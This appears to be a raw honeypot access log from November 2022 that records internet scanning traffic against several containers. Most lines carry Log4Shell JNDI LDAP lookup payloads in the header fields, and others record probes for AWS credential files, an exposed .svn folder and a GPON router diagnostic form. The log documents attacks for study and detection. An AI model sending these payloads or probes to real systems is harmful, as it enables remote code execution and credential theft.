swipe-t-2_running | 20.4.210.27 | 12/Nov/2022:17:26:19 | GET /.svn/ HTTP/1.1 | - | Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36 | y
it-t-2_running | 117.80.212.33 | 14/Nov/2022:11:14:33 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
it-t-2_running | 31.14.115.42 | 14/Nov/2022:11:14:59 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
it-t-2_running | 157.245.137.18 | 14/Nov/2022:11:15:41 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
it-t-2_running | 61.102.42.5 | 14/Nov/2022:11:16:45 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
it-t-2_running | 120.236.79.182 | 14/Nov/2022:11:16:56 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
it-t-2_running | 223.171.91.187 | 14/Nov/2022:11:17:27 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
it-t-2_running | 222.134.240.91 | 14/Nov/2022:11:17:37 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
it-t-2_running | 102.141.225.238 | 14/Nov/2022:11:17:42 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
it-t-2_running | 187.6.3.3 | 14/Nov/2022:11:18:36 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
it-t-2_running | 103.105.12.48 | 14/Nov/2022:11:19:29 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
it-t-2_running | 85.53.55.133 | 14/Nov/2022:11:19:56 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
it-t-2_running | 89.100.220.200 | 14/Nov/2022:11:22:07 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
it-t-2_running | 93.176.229.145 | 14/Nov/2022:11:22:14 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
it-t-2_running | 139.59.135.142 | 14/Nov/2022:11:22:25 | GET / HTTP/1.1 | ${jndi:ldap://139.59.135.142:8184/a} | ${jndi:ldap://139.59.135.142:8184/a} | y
it-t-2_running | 120.236.74.234 | 14/Nov/2022:11:23:12 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
it-t-2_running | 179.43.154.151 | 14/Nov/2022:11:23:58 | \x16\x03\x01 | - | - | n
it-t-2_running | 179.43.154.151 | 14/Nov/2022:11:23:58 | GET /.aws/credentials HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 | y
it-t-2_running | 195.87.73.208 | 14/Nov/2022:11:27:54 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
it-t-2_running | 85.51.24.68 | 14/Nov/2022:11:34:19 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
it-t-2_running | 45.120.216.114 | 14/Nov/2022:11:35:39 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
it-t-2_running | 222.117.95.174 | 14/Nov/2022:11:49:24 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
swipe-t_running | 70.60.102.117 | 14/Nov/2022:11:35:26 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
swipe-t_running | 70.60.102.117 | 14/Nov/2022:11:50:54 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
swipe-t_running | 194.146.24.107 | 14/Nov/2022:11:55:16 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
swipe-t-2_running | 184.67.149.186 | 14/Nov/2022:12:04:53 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
swipe-t-2_running | 223.171.91.149 | 14/Nov/2022:12:07:39 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
blank-t_running | 102.141.225.238 | 14/Nov/2022:12:18:32 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
swipe-t-2_running | 27.1.44.56 | 14/Nov/2022:12:14:29 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
swipe-t-2_running | 41.216.183.132 | 14/Nov/2022:12:14:53 | GET / HTTP/1.1 | - | - | y
swipe-t-2_running | 41.216.183.132 | 14/Nov/2022:12:15:00 | POST /GponForm/diag_Form?images/ HTTP/1.1 | - | Momentum | n
swipe-t-2_running | 121.200.53.148 | 14/Nov/2022:12:19:50 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
swipe-t-2_running | 69.236.215.6 | 14/Nov/2022:12:22:15 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
blank-t_running | 222.117.95.174 | 14/Nov/2022:12:27:35 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
blank-t_running | 223.171.91.133 | 14/Nov/2022:12:27:56 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t_running | 45.120.216.114 | 14/Nov/2022:12:31:12 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
blank-t_running | 144.22.130.100 | 14/Nov/2022:12:32:11 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
blank-t_running | 143.198.133.234 | 14/Nov/2022:12:34:50 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t-2_running | 195.87.73.176 | 14/Nov/2022:12:31:14 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
blank-t_running | 89.100.220.200 | 14/Nov/2022:12:39:57 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
blank-t-2_running | 167.94.138.117 | 14/Nov/2022:11:56:05 | GET / HTTP/1.1 | - | - | y
blank-t-2_running | 167.94.138.117 | 14/Nov/2022:11:56:05 | GET / HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
blank-t-2_running | 167.94.138.117 | 14/Nov/2022:11:56:05 | PRI command-cache.json cron_jobs force_cleanup.sh honeypot_environment nat_rules.sh process_complete_container.sh README.md serve_honeypot.sh start_all_honeypots.sh start_up HTTP/2.0 | - | - | n
blank-t-2_running | 167.94.138.117 | 14/Nov/2022:11:56:10 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/) | y
blank-t-2_running | 80.153.159.119 | 14/Nov/2022:12:04:34 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
blank-t-2_running | 41.216.183.132 | 14/Nov/2022:12:18:05 | GET / HTTP/1.1 | - | - | y
blank-t-2_running | 41.216.183.132 | 14/Nov/2022:12:18:21 | POST /GponForm/diag_Form?images/ HTTP/1.1 | - | Momentum | n
blank-t_running | 82.64.113.245 | 14/Nov/2022:12:47:58 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
blank-t_running | 70.60.102.117 | 14/Nov/2022:12:49:35 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t_running | 40.87.11.253 | 14/Nov/2022:12:49:36 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
pwd-t_running | 129.154.55.234 | 14/Nov/2022:11:57:22 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
pwd-t_running | 213.255.16.153 | 14/Nov/2022:12:08:19 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
pwd-t_running | 195.87.73.176 | 14/Nov/2022:12:10:52 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
pwd-t_running | 209.216.177.158 | 14/Nov/2022:12:13:00 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
pwd-t_running | 195.87.73.208 | 14/Nov/2022:12:15:19 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
pwd-t_running | 31.14.115.42 | 14/Nov/2022:12:16:09 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
pwd-t_running | 144.22.191.115 | 14/Nov/2022:12:16:30 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
pwd-t_running | 89.100.220.200 | 14/Nov/2022:12:16:37 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
pwd-t_running | 72.132.58.237 | 14/Nov/2022:12:17:02 | GET / HTTP/1.1 | ${jndi:ldap://72.132.58.237:8185/a} | ${jndi:ldap://72.132.58.237:8185/a} | y
pwd-t_running | 69.236.215.6 | 14/Nov/2022:12:17:20 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
pwd-t_running | 209.216.177.158 | 14/Nov/2022:12:17:42 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
pwd-t_running | 184.67.149.186 | 14/Nov/2022:12:19:48 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
pwd-t_running | 82.64.113.245 | 14/Nov/2022:12:20:47 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
pwd-t_running | 185.55.64.228 | 14/Nov/2022:12:21:08 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
pwd-t_running | 37.44.238.67 | 14/Nov/2022:12:21:59 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
pwd-t_running | 85.105.58.118 | 14/Nov/2022:12:23:40 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
pwd-t_running | 45.120.216.114 | 14/Nov/2022:12:27:21 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
pwd-t_running | 89.121.228.38 | 14/Nov/2022:12:34:45 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
pwd-t_running | 194.146.24.107 | 14/Nov/2022:12:39:58 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
pwd-t_running | 37.44.238.205 | 14/Nov/2022:12:51:35 | GET / HTTP/1.1 | - | Linux Gnu (cow) | y
blank-t_running | 195.87.73.208 | 14/Nov/2022:12:56:21 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
it-t_running | 109.206.243.162 | 14/Nov/2022:12:05:49 | GET /explore HTTP/1.1 | - | Lynx/2.8.7dev.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8d | y
it-t_running | 194.146.24.107 | 14/Nov/2022:12:14:39 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
it-t-2_running | 194.146.24.107 | 14/Nov/2022:12:12:01 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
it-t-2_running | 143.198.133.234 | 14/Nov/2022:12:26:06 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
it-t-2_running | 176.103.102.18 | 14/Nov/2022:12:30:26 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36 | y
it-t-2_running | 194.146.24.107 | 14/Nov/2022:12:32:49 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
it-t-2_running | 34.76.158.233 | 14/Nov/2022:12:38:56 | GET / HTTP/1.1 | - | python-requests/2.28.1 | y
it-t-2_running | 37.44.238.205 | 14/Nov/2022:12:42:21 | GET / HTTP/1.1 | - | Linux Gnu (cow) | y
swipe-t_running | 1.220.98.197 | 14/Nov/2022:12:37:33 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
swipe-t_running | 183.136.225.32 | 14/Nov/2022:12:41:46 | GET / HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0 | y
swipe-t_running | 183.136.225.32 | 14/Nov/2022:12:47:55 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
swipe-t_running | 183.136.225.32 | 14/Nov/2022:12:47:55 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
swipe-t_running | 183.136.225.32 | 14/Nov/2022:12:47:56 | GET /robots.txt HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
swipe-t_running | 194.146.24.107 | 14/Nov/2022:13:01:37 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
blank-t_running | 120.224.143.251 | 14/Nov/2022:13:24:42 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
blank-t_running | 182.224.177.33 | 14/Nov/2022:13:26:26 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
blank-t_running | 191.242.188.103 | 14/Nov/2022:13:28:18 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
blank-t_running | 70.60.102.117 | 14/Nov/2022:13:32:21 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t_running | 192.241.211.78 | 14/Nov/2022:13:32:23 | MGLNDD_128.8.238.106_80\n | - | - | n
blank-t_running | 144.22.191.115 | 14/Nov/2022:13:41:45 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
blank-t_running | 146.56.115.253 | 14/Nov/2022:13:41:54 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
blank-t-2_running | 37.44.238.114 | 14/Nov/2022:13:21:20 | GET / HTTP/1.1 | - | Linux Gnu (cow) | y
blank-t-2_running | 183.136.225.32 | 14/Nov/2022:13:21:54 | GET / HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0 | y
blank-t-2_running | 183.136.225.32 | 14/Nov/2022:13:28:03 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
blank-t-2_running | 183.136.225.32 | 14/Nov/2022:13:28:03 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
blank-t-2_running | 183.136.225.32 | 14/Nov/2022:13:28:04 | GET /robots.txt HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE | y
blank-t-2_running | 192.241.211.78 | 14/Nov/2022:13:32:34 | MGLNDD_128.8.238.163_80\n | - | - | n
blank-t-2_running | 92.118.39.78 | 14/Nov/2022:13:45:54 | GET / HTTP/1.1 | - | - | y
blank-t_running | 1.220.98.197 | 14/Nov/2022:13:53:07 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
blank-t_running | 129.154.55.234 | 14/Nov/2022:13:53:57 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
blank-t_running | 93.176.229.145 | 14/Nov/2022:13:55:30 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
pwd-t_running | 74.82.47.20 | 14/Nov/2022:12:59:52 | GET / HTTP/1.1 | - | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 | y
pwd-t_running | 144.22.191.115 | 14/Nov/2022:13:00:33 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
pwd-t_running | 74.82.47.4 | 14/Nov/2022:13:05:14 | GET /favicon.ico HTTP/1.1 | - | Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0 | y
pwd-t_running | 184.67.149.186 | 14/Nov/2022:13:05:51 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
pwd-t_running | 80.153.159.119 | 14/Nov/2022:13:06:22 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
pwd-t_running | 185.55.64.228 | 14/Nov/2022:13:06:30 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
pwd-t_running | 144.22.191.115 | 14/Nov/2022:13:09:29 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
pwd-t_running | 223.171.91.128 | 14/Nov/2022:13:09:45 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
pwd-t_running | 94.177.20.162 | 14/Nov/2022:13:14:25 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
pwd-t_running | 89.100.220.200 | 14/Nov/2022:13:15:39 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
pwd-t_running | 159.65.242.113 | 14/Nov/2022:13:17:02 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
pwd-t_running | 121.200.53.148 | 14/Nov/2022:13:17:18 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
pwd-t_running | 223.171.91.143 | 14/Nov/2022:13:18:06 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
pwd-t_running | 40.87.11.253 | 14/Nov/2022:13:18:40 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
pwd-t_running | 187.6.3.3 | 14/Nov/2022:13:20:19 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
pwd-t_running | 191.242.188.103 | 14/Nov/2022:13:20:48 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
pwd-t_running | 82.64.113.245 | 14/Nov/2022:13:20:51 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
pwd-t_running | 93.91.117.60 | 14/Nov/2022:13:21:03 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
pwd-t_running | 85.53.55.133 | 14/Nov/2022:13:21:16 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
pwd-t_running | 129.154.55.234 | 14/Nov/2022:13:23:35 | GET / HTTP/1.1 | ${jndi:ldap://:8188/a} | ${jndi:ldap://:8188/a} | y
pwd-t_running | 222.103.98.58 | 14/Nov/2022:13:23:42 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
pwd-t_running | 89.212.123.191 | 14/Nov/2022:13:23:52 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
pwd-t_running | 72.132.58.237 | 14/Nov/2022:13:24:17 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
pwd-t_running | 209.216.177.158 | 14/Nov/2022:13:24:36 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
pwd-t_running | 195.87.73.208 | 14/Nov/2022:13:25:27 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
pwd-t_running | 85.51.217.156 | 14/Nov/2022:13:25:42 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
pwd-t_running | 218.146.15.97 | 14/Nov/2022:13:27:23 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
pwd-t_running | 45.120.216.114 | 14/Nov/2022:13:27:55 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
pwd-t_running | 1.220.98.197 | 14/Nov/2022:13:27:59 | GET / HTTP/1.1 | ${jndi:ldap://:8181/a} | ${jndi:ldap://:8181/a} | y
pwd-t_running | 144.22.191.115 | 14/Nov/2022:13:28:13 | GET / HTTP/1.1 | ${jndi:ldap://:8183/a} | ${jndi:ldap://:8183/a} | y
pwd-t_running | 144.22.130.100 | 14/Nov/2022:13:29:21 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
pwd-t_running | 113.125.191.234 | 14/Nov/2022:13:30:13 | GET / HTTP/1.1 | ${jndi:ldap://:8187/a} | ${jndi:ldap://:8187/a} | y
pwd-t_running | 69.236.215.6 | 14/Nov/2022:13:32:34 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
pwd-t_running | 192.241.211.78 | 14/Nov/2022:13:32:53 | MGLNDD_128.8.238.49_80\n | - | - | n
pwd-t_running | 147.182.233.56 | 14/Nov/2022:13:37:08 | GET / HTTP/1.1 | ${jndi:ldap://:8189/a} | ${jndi:ldap://:8189/a} | y
pwd-t_running | 195.87.73.176 | 14/Nov/2022:13:38:31 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
pwd-t_running | 37.44.238.114 | 14/Nov/2022:13:52:43 | GET / HTTP/1.1 | - | Linux Gnu (cow) | y
swipe-t-2_running | 37.44.238.67 | 14/Nov/2022:13:16:24 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
swipe-t-2_running | 222.134.240.91 | 14/Nov/2022:13:17:17 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t-2_running | 89.121.228.38 | 14/Nov/2022:13:23:06 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
swipe-t-2_running | 192.241.211.78 | 14/Nov/2022:13:33:07 | MGLNDD_128.8.238.140_80\n | - | - | n
swipe-t-2_running | 94.177.20.162 | 14/Nov/2022:13:33:36 | GET / HTTP/1.1 | ${jndi:ldap://:8185/a} | ${jndi:ldap://:8185/a} | y
swipe-t-2_running | 85.51.217.156 | 14/Nov/2022:13:34:14 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
swipe-t-2_running | 223.171.91.133 | 14/Nov/2022:13:39:23 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t_running | 191.242.188.103 | 14/Nov/2022:14:01:02 | GET / HTTP/1.1 | ${jndi:ldap://:8186/a} | ${jndi:ldap://:8186/a} | y
blank-t_running | 43.242.247.139 | 14/Nov/2022:14:03:48 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
blank-t_running | 93.176.229.145 | 14/Nov/2022:14:07:12 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
it-t_running | 194.146.24.107 | 14/Nov/2022:13:17:11 | GET /config/getuser?index=0 HTTP/1.1 | - | Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0 | y
it-t_running | 81.163.112.176 | 14/Nov/2022:13:19:00 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 | y
it-t_running | 51.254.59.113 | 14/Nov/2022:13:24:52 | GET / HTTP/1.1 | - | Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 | y
it-t_running | 192.241.211.78 | 14/Nov/2022:13:32:24 | MGLNDD_128.8.238.30_80\n | - | - | n
it-t_running | 222.117.95.174 | 14/Nov/2022:13:41:45 | GET / HTTP/1.1 | ${jndi:ldap://:8184/a} | ${jndi:ldap://:8184/a} | y
it-t_running | 222.117.95.174 | 14/Nov/2022:13:42:14 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
it-t_running | 222.117.95.174 | 14/Nov/2022:13:43:36 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
it-t_running | 92.118.39.78 | 14/Nov/2022:13:50:39 | GET / HTTP/1.1 | - | - | y
blank-t_running | 159.65.242.113 | 14/Nov/2022:14:09:02 | GET / HTTP/1.1 | ${jndi:ldap://:8180/a} | ${jndi:ldap://:8180/a} | y
blank-t_running | 144.22.130.100 | 14/Nov/2022:14:09:28 | GET / HTTP/1.1 | ${jndi:ldap://:8182/a} | ${jndi:ldap://:8182/a} | y
it-t-2_running | 92.118.39.78 | 14/Nov/2022:13:17:21 | GET / HTTP/1.1 | - | - | y
